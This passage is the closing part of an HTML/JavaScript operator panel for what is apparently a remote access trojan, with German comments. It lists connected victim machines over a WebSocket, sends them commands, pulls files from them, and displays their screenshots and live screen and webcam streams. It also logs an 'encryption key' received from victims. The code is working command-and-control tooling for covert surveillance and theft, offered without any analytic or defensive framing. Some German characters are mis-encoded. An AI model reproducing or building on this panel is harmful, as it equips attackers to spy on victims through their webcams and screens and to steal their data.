          screenCanvas.getContext('2d').clearRect(0, 0, screenCanvas.width, screenCanvas.height);
        }
        if (screenStatus) screenStatus.textContent = "";
      }
    }

    // --- Webcam Live-Stream UI ---
    let webcamArea = null;
    let webcamCanvas = null;
    let webcamStatus = null;
    let wsMessageHandler = null; // Speichert den Standardhandler

    function ensureWebcamArea() {
      if (!webcamArea) {
        webcamArea = document.createElement("div");
        webcamArea.id = "webcam-area";
        webcamArea.style.display = "none";
        webcamArea.innerHTML = `
          <canvas id="webcam-canvas" tabindex="0"></canvas>
          <div id="webcam-status"></div>
        `;
        document.getElementById("main-panel").appendChild(webcamArea);
        webcamCanvas = webcamArea.querySelector("#webcam-canvas");
        webcamStatus = webcamArea.querySelector("#webcam-status");
      }
    }
    function handleWebcamCommand(cmd) {
      ensureWebcamArea();
      if (cmd === "/webcam_start" || cmd === "webcam_start") {
        webcamArea.style.display = "";
        if (webcamStatus) webcamStatus.textContent = "Webcam-Stream wird gestartet...";
      } else if (cmd === "/webcam_stop" || cmd === "webcam_stop") {
        webcamArea.style.display = "none";
        if (webcamCanvas && webcamCanvas.getContext) {
          webcamCanvas.getContext('2d').clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
        }
        if (webcamStatus) webcamStatus.textContent = "";
      }
    }

    // --- WebSocket Initialisierung ---
    window.initRatApp = function(token) {
      // WebSocket mit Token als Query-Parameter
      const ws = new WebSocket(
        (location.protocol === "https:" ? "wss://" : "ws://") +
        location.host +
        "/ws?token=" + encodeURIComponent(token || window._rat_token || "")
      );
      window.ws = ws;

      // --- Webcam-Frame Empfang ---
      function webcamFrameHandler(event) {
        // 1. Meta-Frame (action: webcam_frame)
        let meta;
        try {
          meta = JSON.parse(event.data);
        } catch {
          return;
        }
        if (meta.action === "webcam_frame") {
          ensureWebcamArea();
          if (webcamArea) webcamArea.style.display = "";
          // 2. N√§chstes Frame ist das Bild (base64)
          ws.onmessage = function (event2) {
            // Fix: Pr√ºfe, ob das Frame base64 ist, sonst als Bin√§rdaten behandeln
            let b64 = null;
            // Server sendet als {action: "webcam_frame", img_base64: ...}
            try {
              const d = JSON.parse(event2.data);
              if (d.action === "webcam_frame" && d.img_base64) {
                b64 = d.img_base64;
              }
            } catch {
              if (typeof event2.data === "string" && event2.data.length > 100) {
                b64 = event2.data;
              }
            }
            if (b64) {
              const img = new window.Image();
              img.onload = function () {
                webcamCanvas.width = img.width;
                webcamCanvas.height = img.height;
                const ctx = webcamCanvas.getContext("2d");
                ctx.clearRect(0, 0, webcamCanvas.width, webcamCanvas.height);
                ctx.drawImage(img, 0, 0, img.width, img.height);
              };
              img.src = "data:image/jpeg;base64," + b64;
              if (webcamStatus) webcamStatus.textContent = "Live-Webcam";
              ws.onmessage = wsMessageHandler;
            }
          };
        } else {
          wsMessageHandler(event);
        }
      }

      ws.onopen = () => {
        log("WebSocket verbunden.", "info");
        debugLog("WebSocket verbunden", "info");
      };

      ws.onclose = () => {
        log("WebSocket getrennt.", "error");
        debugLog("WebSocket getrennt", "warn");
      };

      ws.onerror = (e) => {
        log("WebSocket Fehler.", "error");
        debugLog("WebSocket Fehler: " + e, "error");
      };

      wsMessageHandler = function(event) {
        let data;
        try {
          data = JSON.parse(event.data);
        } catch (e) {
          debugLog("Fehler beim Parsen der Nachricht: " + e, "error");
          return;
        }
        if (data.type === "client_list") {
          renderClientList(data.clients || []);
        } else if (data.type === "client_connected" || data.type === "client_disconnected") {
          ws.send(JSON.stringify({ action: "get_clients" }));
        } else if (data.type === "command_output") {
          log(data.output || "Kein Output.", "info");
        } else if (data.type === "file_download") {
          const blob = b64toBlob(data.data, "application/octet-stream");
          const a = document.createElement("a");
          a.href = URL.createObjectURL(blob);
          a.download = data.filename || "download.bin";
          a.click();
          log("Datei-Download gestartet: " + (data.filename || ""), "info");
        } else if (data.type === "screenshot") {
          const img = document.createElement("img");
          img.src = "data:image/png;base64," + data.data;
          img.style.maxWidth = "100%";
          output.appendChild(img);
          log("Screenshot empfangen.", "info");
        } else if (data.action === "screen_frame") {
          if (liveScreenArea) liveScreenArea.style.display = "";
          if (screenCanvas) {
            const ctx = screenCanvas.getContext("2d");
            const img = new window.Image();
            img.onload = function () {
              screenCanvas.width = data.width;
              screenCanvas.height = data.height;
              ctx.clearRect(0, 0, screenCanvas.width, screenCanvas.height);
              ctx.drawImage(img, 0, 0, data.width, data.height);
            };
            img.src = "data:image/jpeg;base64," + data.img_bytes;
          }
          if (screenStatus) screenStatus.textContent = "Live-Bild";
        } else if (data.action === "webcam_frame") {
          // Spezialbehandlung: Webcam-Stream
          webcamFrameHandler(event);
          return;
        } else if (data.type === "encryption_key") {
          log("Verschl√ºsselungs-Schl√ºssel empfangen: " + data.key_hex, "info");
        } else if (data.type === "error") {
          log(data.message || data.error || "Fehler", "error");
        } else if (data.type === "debug") {
          debugLog(data.msg, data.level || "info");
        } else if (data.type === "client_log") {
          log("[Client] " + (data.msg || ""), data.level || "info");
          debugLog("[Client] " + (data.msg || ""), data.level || "info");
        } else if (data.type === "webcam_image") {
          const img = document.createElement("img");
          img.src = "data:image/png;base64," + data.data;
          img.style.maxWidth = "100%";
          output.appendChild(img);
          log("Webcam-Bild empfangen.", "info");
        }
      };

      // --- Senden-Button ---
      sendButton.onclick = () => sendCommand();
      commandInput.addEventListener("keydown", (e) => {
        if (e.key === "Enter" && !e.shiftKey) {
          sendCommand();
        }
      });
    };

    // Starte App, falls Token schon da (Auto-Login)
    if (window._rat_token) {
      window.initRatApp(window._rat_token);
    }
  </script>
</body>
</html>